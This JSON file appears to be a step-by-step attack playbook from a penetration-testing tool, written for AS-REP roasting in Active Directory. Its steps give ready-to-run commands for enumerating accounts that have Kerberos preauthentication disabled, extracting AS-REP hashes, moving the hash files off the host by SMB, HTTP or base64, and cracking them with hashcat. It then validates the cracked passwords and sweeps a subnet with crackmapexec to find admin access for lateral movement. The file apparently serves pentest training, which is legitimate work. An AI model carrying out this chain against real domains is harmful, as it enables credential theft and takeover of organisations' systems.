{
  "id": "ad-asreproast-full",
  "name": "Active Directory AS-REP Roasting Full Attack Chain",
  "description": "Complete AS-REP roasting attack chain from enumeration to credential validation.\n\nIdentifies users with Kerberos preauthentication disabled, extracts offline-crackable AS-REP hashes, cracks passwords with Hashcat, validates credentials, and checks for local admin rights for lateral movement opportunities.",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - pentest Track",
    "created": "2025-11-10",
    "updated": "2025-11-10",
    "tags": [
      "ACTIVE_DIRECTORY",
      "AS-REP_ROASTING",
      "KERBEROS",
      "CREDENTIAL_ACCESS",
      "OFFLINE_CRACKING",
      "LATERAL_MOVEMENT"
    ],
    "category": "credential-access",
    "platform": "active-directory",
    "references": [
      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py",
      "https://github.com/GhostPack/Rubeus",
      "https://attack.mitre.org/techniques/T1558/004/",
      "https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/"
    ]
  },
  "difficulty": "beginner",
  "time_estimate": "90 minutes",
  "prerequisites": [
    "Valid domain user credentials (for authenticated enumeration) OR network access to domain controller UDP port 88 (for unauthenticated enumeration with username wordlist)",
    "Network access to domain controller (Linux: impacket-GetNPUsers) OR RDP/WinRM access to domain-joined Windows system (Rubeus)",
    "Hashcat installed for offline hash cracking (Kali Linux or physical machine with GPU recommended)"
  ],
  "notes": "QUICK WIN: AS-REP roasting is fast reconnaissance attack (30 seconds to identify vulnerable users, 1-60 minutes to crack). NO LOCKOUT RISK - safe to attempt even on sensitive domains. SUCCESS RATE: Variable - depends on misconfigurations (0-10% of domains have vulnerable users). DEFAULT AD SETTING: Preauthentication ENABLED (secure). Vulnerable users are rare - typically legacy service accounts or misconfigurations. LINUX vs WINDOWS: Linux (impacket-GetNPUsers) requires valid credentials. Windows (Rubeus) uses current user context (no credential entry needed). TIME SYNC CRITICAL: Kerberos requires <5 minute clock difference. Use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur. HASH FORMAT: $krb5asrep$23$ = Hashcat mode 18200 (Kerberos 5 AS-REP etype 23). CRACKING SPEED: RC4-HMAC is fast - rockyou.txt straight dictionary <1 second on GPU, 1-5 minutes with rule-based attack. COMPLEMENTARY TO PASSWORD SPRAYING: Different attack surface - may find credentials password spraying misses.",
  "steps": [
    {
      "id": "verify-domain-access",
      "name": "Verify Domain Access and Time Synchronization",
      "objective": "Confirm network connectivity to domain controller and synchronize system time to avoid Kerberos errors",
      "description": "REQUIREMENTS: Network access to DC (Kerberos port 88 for Linux OR RDP/WinRM for Windows).\n\nLINUX TIME SYNC: Kerberos requires <5 minute clock difference.\nUse ntpdate or rdate to sync with DC: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>.\nVerification: date (shows system time).\nCompare with DC time.\n\nWINDOWS: Time sync handled automatically on domain-joined systems (no action needed).\n\nCONNECTIVITY TEST: Linux \u2192 sudo nmap -p 88 -Pn -sU -v <DC_IP> (verify UDP 88 open/filtered).\nWindows \u2192 test-netconnection <DC_IP> -port 88 (verify connectivity).\n\nCRITICAL: If time sync fails, Kerberos will return KRB_AP_ERR_SKEW error and attack cannot proceed.",
      "command_ref": "nmap-udp-scan",
      "evidence": [
        "System time synchronized with domain controller (within 5 minutes)",
        "Kerberos port 88/UDP accessible (Linux) OR RDP/WinRM session established (Windows)",
        "No KRB_AP_ERR_SKEW errors in test queries"
      ],
      "dependencies": [],
      "repeatable": false,
      "success_criteria": [
        "Time difference <5 minutes between attack system and DC",
        "Network connectivity to DC confirmed",
        "Kerberos test query succeeds (no time sync errors)"
      ],
      "failure_conditions": [
        "KRB_AP_ERR_SKEW error (time sync failed)",
        "UDP port 88 filtered (firewall blocking Kerberos)",
        "No network route to DC"
      ],
      "next_steps": [
        "identify-vulnerable-users"
      ]
    },
    {
      "id": "identify-vulnerable-users",
      "name": "Enumerate Users with Preauthentication Disabled",
      "objective": "Identify all users with DONT_REQ_PREAUTH flag (vulnerable to AS-REP roasting)",
      "description": "LINUX AUTHENTICATED: impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (no -request flag = enumeration only).\nRequires valid domain credentials.\n\nLINUX UNAUTHENTICATED: impacket-GetNPUsers -usersfile <USERLIST> -dc-ip <DC_IP> <DOMAIN>/ -no-pass (requires username wordlist, rare to succeed).\n\nWINDOWS: Rubeus.exe asreproast /nowrap (uses current user context, no credentials needed) OR PowerView Get-DomainUser -PreauthNotRequired.\n\nOUTPUT ANALYSIS: Name (username), MemberOf (group membership - prioritize admin groups), PasswordLastSet (old dates = weak passwords), UAC (0x410200 = preauthentication disabled).\n\nEXPECTED RESULTS: 0-5 vulnerable users typical.\n0 users = NORMAL (preauthentication enabled by default).\n>5 users = misconfigured environment or many legacy accounts.\n\nTIME ESTIMATE: <5 seconds for enumeration.",
      "command_ref": "impacket-getnpusers-identify",
      "evidence": [
        "List of users with DONT_REQ_PREAUTH flag",
        "User attributes: samaccountname, memberof, pwdlastset, UAC flag",
        "Vulnerable user count documented (may be 0)"
      ],
      "dependencies": [
        "verify-domain-access"
      ],
      "repeatable": true,
      "success_criteria": [
        "Enumeration completed without errors",
        "User attributes retrieved successfully",
        "Results documented (even if 0 vulnerable users)"
      ],
      "failure_conditions": [
        "Access denied (invalid credentials)",
        "KRB_AP_ERR_SKEW (time sync failed - return to step 1)",
        "KDC_ERR_C_PRINCIPAL_UNKNOWN (wrong domain name)"
      ],
      "next_steps": [
        "extract-asrep-hashes"
      ]
    },
    {
      "id": "extract-asrep-hashes",
      "name": "Request and Extract AS-REP Hashes",
      "objective": "Request AS-REP responses and extract encrypted hashes for offline cracking",
      "description": "LINUX: impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>.\nThe -request flag triggers TGT requests for all vulnerable users.\n-outputfile saves hashes in Hashcat mode 18200 format.\n\nWINDOWS: Rubeus.exe asreproast /nowrap /outfile:C:\\hashes.asreproast.\nThe /nowrap flag prevents line breaks in hash (Hashcat requires single-line format).\n/outfile saves hashes to file.\n\nHASH FORMAT: $krb5asrep$23$user@DOMAIN.COM:hash_data.\nThe '23' indicates etype 23 (RC4-HMAC).\n\nCRITICAL: If step 2 found 0 vulnerable users, this step will return 'No entries' - this is EXPECTED and NOT a failure.\nDocument result and proceed to alternative credential access methods.\n\nTIME ESTIMATE: <10 seconds for hash extraction.",
      "command_ref": "impacket-getnpusers-asreproast",
      "evidence": [
        "AS-REP hashes saved to file (hashes.asreproast)",
        "Hash format verified: $krb5asrep$23$...",
        "One hash per vulnerable user found in step 2"
      ],
      "dependencies": [
        "identify-vulnerable-users"
      ],
      "repeatable": true,
      "success_criteria": [
        "Hashes extracted for all vulnerable users",
        "Hash file created successfully",
        "Hash format compatible with Hashcat mode 18200"
      ],
      "failure_conditions": [
        "No entries found (no vulnerable users - proceed to alternative attacks)",
        "KRB_AP_ERR_SKEW (time sync issue)",
        "Hash format incorrect (missing /nowrap flag on Rubeus)"
      ],
      "next_steps": [
        "transfer-hashes",
        "crack-asrep-hashes"
      ]
    },
    {
      "id": "transfer-hashes",
      "name": "Transfer Hashes to Cracking System (If Needed)",
      "objective": "Move hash files from Windows to Linux Kali system for Hashcat cracking",
      "description": "SKIP IF: Hashes extracted on Kali Linux directly (impacket-GetNPUsers).\nProceed directly to step 5 (crack-asrep-hashes).\n\nREQUIRED IF: Hashes extracted on Windows with Rubeus.\nMust transfer to Kali for Hashcat cracking (Kali has better wordlists, GPU support).\n\nTRANSFER METHODS:\n(1) SMB share: Kali \u2192 sudo impacket-smbserver share /home/kali/hashes -smb2support -username user -password pass.\nWindows \u2192 copy C:\\hashes.asreproast \\\\KALI_IP\\share\\hashes.asreproast.\n\n(2) RDP disk sharing: rdesktop -r disk:share=/home/kali/hashes <WINDOWS_IP>, then copy C:\\hashes.asreproast to \\\\tsclient\\share.\n\n(3) Base64 encode: Windows \u2192 certutil -encode C:\\hashes.asreproast C:\\hashes.b64, paste to Kali, base64 -d > hashes.asreproast.\n\n(4) HTTP server: Kali \u2192 python3 -m http.server 8000 (POST endpoint), Windows \u2192 curl or PowerShell Invoke-WebRequest.\n\nTIME ESTIMATE: 30-60 seconds.",
      "command_ref": "impacket-smbserver",
      "evidence": [
        "Hash file present on Kali system",
        "File integrity verified (hash count matches Windows extraction)",
        "File permissions correct (readable by current user)"
      ],
      "dependencies": [
        "extract-asrep-hashes"
      ],
      "repeatable": true,
      "success_criteria": [
        "Hash file successfully transferred to Kali",
        "File contents verified (hashes intact)",
        "No corruption during transfer"
      ],
      "failure_conditions": [
        "Transfer failed (network connectivity)",
        "File corruption (hash format invalid after transfer)",
        "Permission denied (file not readable)"
      ],
      "next_steps": [
        "crack-asrep-hashes"
      ]
    },
    {
      "id": "crack-asrep-hashes",
      "name": "Crack AS-REP Hashes with Hashcat Mode 18200",
      "objective": "Recover plaintext passwords from AS-REP hashes using offline dictionary and rule-based attacks",
      "description": "HASHCAT MODE: 18200 (Kerberos 5, etype 23, AS-REP).\nVERIFY: hashcat --help | grep -i 'Kerberos' shows mode 18200.\n\nATTACK STRATEGY:\n(1) STRAIGHT DICTIONARY: hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force (try first - fast, 14M passwords in <1 sec on GPU, ~30 sec on CPU).\n\n(2) RULE-BASED: hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds common mutations - Password \u2192 Password1!, Password123, etc.).\n\n(3) TARGETED: Create custom wordlist from username, org name, common patterns.\nExample: echo -e 'dave\\nDave\\nDAVE\\ndave123\\nDave2023!' > custom.txt; hashcat -m 18200 hashes.asreproast custom.txt.\n\n--force FLAG: Required in Kali VM without GPU (suppresses OpenCL warnings).\n\nMONITORING: Press 's' key for status, --status --status-timer=30 for automatic updates.\n\nTIME ESTIMATE: Weak password (dictionary + number) = 1-10 minutes.\nStrong password (random 12+ chars) = infeasible.",
      "command_ref": "hashcat-crack-asrep",
      "evidence": [
        "Hashcat output shows 'Cracked' status",
        "Password recovered and displayed: user@DOMAIN.COM:password",
        "Result saved to hashcat.potfile automatically"
      ],
      "dependencies": [
        "transfer-hashes"
      ],
      "repeatable": true,
      "success_criteria": [
        "At least one password cracked successfully",
        "Password documented for next steps",
        "Hash remains in potfile for future reference"
      ],
      "failure_conditions": [
        "Exhausted - password not in wordlist (try larger wordlist or different rules)",
        "Token length exception (hash format incorrect - check /nowrap flag was used)",
        "Strong password (>12 random chars - may be infeasible to crack)"
      ],
      "next_steps": [
        "validate-credentials",
        "check-admin-rights"
      ]
    },
    {
      "id": "validate-credentials",
      "name": "Validate Cracked Credentials",
      "objective": "Confirm cracked passwords are valid and accounts are active",
      "description": "QUICK VALIDATION: Use kerbrute passwordspray with single-user file.\nCreate file: echo 'dave' > single_user.txt.\nTest: kerbrute passwordspray -d corp.com --dc <DC_IP> single_user.txt 'Flowers1'.\nOutput: [+] VALID LOGIN: dave@corp.com:Flowers1 confirms credentials work.\n\nALTERNATIVE: CrackMapExec SMB authentication (also checks admin rights in one command - see next step).\nSMB: crackmapexec smb <DC_IP> -u dave -p 'Flowers1' -d corp.com.\nOutput: [+] corp.com\\dave:Flowers1 confirms valid.\n\nTIME ESTIMATE: 5-10 seconds.\n\nFAILURE SCENARIOS: STATUS_LOGON_FAILURE (password incorrect - Hashcat cracked wrong password or account changed), STATUS_ACCOUNT_LOCKED_OUT (account locked since hash extraction), STATUS_ACCOUNT_DISABLED (account disabled by admin).\n\nIf validation fails, try other cracked hashes or proceed to alternative attacks.",
      "command_ref": "kerbrute-validate-creds",
      "evidence": [
        "Credentials validated successfully",
        "[+] VALID LOGIN confirmation from kerbrute or crackmapexec",
        "Account confirmed active and unlocked"
      ],
      "dependencies": [
        "crack-asrep-hashes"
      ],
      "repeatable": true,
      "success_criteria": [
        "Credentials authenticate successfully",
        "Account is active and unlocked",
        "No policy restrictions preventing login"
      ],
      "failure_conditions": [
        "STATUS_LOGON_FAILURE (invalid password)",
        "STATUS_ACCOUNT_LOCKED_OUT (account locked)",
        "STATUS_ACCOUNT_DISABLED (account disabled)"
      ],
      "next_steps": [
        "check-admin-rights"
      ]
    },
    {
      "id": "check-admin-rights",
      "name": "Check for Local Administrator Rights",
      "objective": "Identify systems where compromised user has local administrator privileges for lateral movement",
      "description": "CRACKMAPEXEC SUBNET SCAN: Test credentials against entire subnet to find local admin access.\n\nCOMMAND: crackmapexec smb 10.10.10.0/24 -u dave -p 'Flowers1' -d corp.com.\nScans all 254 IPs in /24 subnet.\n\nOUTPUT: [+] 10.10.10.75 corp.com\\dave:Flowers1 (Pwn3d!) = LOCAL ADMIN rights on 10.10.10.75.\n[+] 10.10.10.80 corp.com\\dave:Flowers1 = valid credentials but NOT admin.\n\nPWND INDICATOR: Shown when user can access ADMIN$ share (local admin rights).\n\nLOCAL ADMIN = FULL SYSTEM COMPROMISE: Can execute code as SYSTEM, dump SAM/LSA secrets, extract cached credentials, dump LSASS memory for plaintext passwords and Kerberos tickets.\n\nLATERAL MOVEMENT: Use evil-winrm, psexec, wmiexec to access (Pwn3d!) systems.\n\nSTANDARD USER (no Pwn3d!): Still valuable - can enumerate AD, access file shares, attempt local privilege escalation, Kerberoast, AS-REP roast other users.\n\nTIME ESTIMATE: 2-4 minutes for /24 subnet scan.",
      "command_ref": "crackmapexec-validate-admin",
      "evidence": [
        "Subnet scan completed",
        "Systems with (Pwn3d!) indicator documented",
        "Local admin access confirmed on X systems"
      ],
      "dependencies": [
        "validate-credentials"
      ],
      "repeatable": true,
      "success_criteria": [
        "Subnet scan completed successfully",
        "Admin rights status determined for compromised user",
        "Target systems identified for lateral movement"
      ],
      "failure_conditions": [
        "SMB port 445 blocked (firewall restrictions)",
        "No (Pwn3d!) systems found (standard user only)",
        "All systems show STATUS_LOGON_FAILURE (credential issue)"
      ],
      "next_steps": []
    }
  ]
}